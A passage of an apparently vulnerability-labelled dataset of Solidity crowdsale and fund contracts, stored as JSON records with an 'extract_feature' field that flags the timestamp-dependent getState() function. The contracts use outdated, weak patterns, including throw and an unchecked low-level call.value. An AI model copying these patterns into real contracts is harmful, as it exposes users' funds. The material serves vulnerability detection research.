super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f13"
  },
  "filename": "6404.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f14"
  },
  "filename": "6454.sol",
  "content": "pragma solidity ^0.4.13;\ninterface FundInterface {\n event PortfolioContent(address[] assets, uint[] holdings, uint[] prices);\n event RequestUpdated(uint id);\n event Redeemed(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n event FeesConverted(uint atTimestamp, uint shareQuantityConverted, uint unclaimed);\n event CalculationUpdate(uint atTimestamp, uint managementFee, uint performanceFee, uint nav, uint sharePrice, uint totalSupply);\n event ErrorMessage(string errorMessage);\n function requestInvestment(uint giveQuantity, uint shareQuantity, address investmentAsset) external;\n function executeRequest(uint requestId) external;\n function cancelRequest(uint requestId) external;\n function redeemAllOwnedAssets(uint shareQuantity) external returns (bool);\n function enableInvestment(address[] ofAssets) external;\n function disableInvestment(address[] ofAssets) external;\n function shutDown() external;\n function emergencyRedeem(uint shareQuantity, address[] requestedAssets) public returns (bool success);\n function calcSharePriceAndAllocateFees() public returns (uint);\n function getModules() view returns (address, address, address);\n function getLastRequestId() view returns (uint);\n function getManager() view returns (address);\n function performCalculations() view returns (uint, uint, uint, uint, uint, uint, uint);\n function calcSharePrice() view returns (uint);\n}\ninterface AssetInterface {\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n function transfer(address _to, uint _value, bytes _data) public returns (bool success);\n function transfer(address _to, uint _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint _value) public returns (bool success);\n function approve(address _spender, uint _value) public returns (bool success);\n function balanceOf(address _owner) view public returns (uint balance);\n function allowance(address _owner, address _spender) public view returns (uint remaining);\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ninterface SharesInterface {\n event Created(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n event Annihilated(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);\n function getName() view returns (bytes32);\n function getSymbol() view returns (bytes8);\n function getDecimals() view returns (uint);\n function getCreationTime() view returns (uint);\n function toSmallestShareUnit(uint quantity) view returns (uint);\n function toWholeShareUnit(uint quantity) view returns (uint);\n}\ninterface CompetitionInterface {\n event Register(uint withId, address fund, address manager);\n event ClaimReward(address registrant, address fund, uint shares);\n function termsAndConditionsAreSigned(address byManager, uint8 v, bytes32 r, bytes32 s) view returns (bool);\n function isWhitelisted(address x) view returns (bool);\n function isCompetitionActive() view returns (bool);\n function getMelonAsset() view returns (address);\n function getRegistrantId(address x) view returns (uint);\n function getRegistrantFund(address x) view returns (address);\n function getCompetitionStatusOfRegistrants() view returns (address[], address[], bool[]);\n function getTimeTillEnd() view returns (uint);\n function getEtherValue(uint amount) view returns (uint);\n function calculatePayout(uint payin) view returns (uint);\n function registerForCompetition(address fund, uint8 v, bytes32 r, bytes32 s) payable;\n function batchAddToWhitelist(uint maxBuyinQuantity, address[] whitelistants);\n function withdrawMln(address to, uint amount);\n function claimReward();\n}\ninterface ComplianceInterface {\n function isInvestmentPermitted(\n address ofParticipant,\n uint256 giveQuantity,\n uint256 shareQuantity\n ) view returns (bool);\n function isRedemptionPermitted(\n address ofParticipant,\n uint256 shareQuantity,\n uint256 receiveQuantity\n ) view returns (bool);\n}\ncontract DBC {\n modifier pre_cond(bool condition) {\n require(condition);\n _;\n }\n modifier post_cond(bool condition) {\n _;\n assert(condition);\n }\n modifier invariant(bool condition) {\n require(condition);\n _;\n assert(condition);\n }\n}\ncontract Owned is DBC {\n address public owner;\n function Owned() { owner = msg.sender; }\n function changeOwner(address ofNewOwner) pre_cond(isOwner()) { owner = ofNewOwner; }\n function isOwner() internal returns (bool) { return msg.sender == owner; }\n}\ncontract CompetitionCompliance is ComplianceInterface, DBC, Owned {\n address public competitionAddress;\n function CompetitionCompliance(address ofCompetition) public {\n competitionAddress = ofCompetition;\n }\n function isInvestmentPermitted(\n address ofParticipant,\n uint256 giveQuantity,\n uint256 shareQuantity\n )\n view\n returns (bool)\n {\n return competitionAddress == ofParticipant;\n }\n function isRedemptionPermitted(\n address ofParticipant,\n uint256 shareQuantity,\n uint256 receiveQuantity\n )\n view\n returns (bool)\n {\n return competitionAddress == ofParticipant;\n }\n function isCompetitionAllowed(\n address x\n )\n view\n returns (bool)\n {\n return CompetitionInterface(competitionAddress).isWhitelisted(x) && CompetitionInterface(competitionAddress).isCompetitionActive();\n }\n function changeCompetitionAddress(\n address ofCompetition\n )\n pre_cond(isOwner())\n {\n competitionAddress = ofCompetition;\n }\n}\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) public view returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n function DSAuth() public {\n owner = msg.sender;\n LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n public\n auth\n {\n owner = owner_;\n LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n public\n auth\n {\n authority = authority_;\n LogSetAuthority(authority);\n }\n modifier auth {\n require(isAuthorized(msg.sender, msg.sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal view returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n}\ncontract DSExec {\n function tryExec( address target, bytes calldata, uint value)\n internal\n returns (bool call_ret)\n {\n return target.call.value(value)(calldata);\n }\n function exec( address target, bytes calldata, uint value)\n internal\n {\n if(!tryExec(target, calldata, value)) {\n revert();\n }\n }\n function exec( address t, bytes c )\n internal\n {\n exec(t, c, 0);\n }\n function exec( address t, uint256 v )\n internal\n {\n bytes memory c; exec(t, c, v);\n }\n function tryExec( address t, bytes c )\n internal\n returns (bool)\n {\n return tryExec(t, c, 0);\n }\n function tryExec( address t, uint256 v )\n internal\n returns (bool)\n {\n bytes memory c; return tryExec(t, c, v);\n 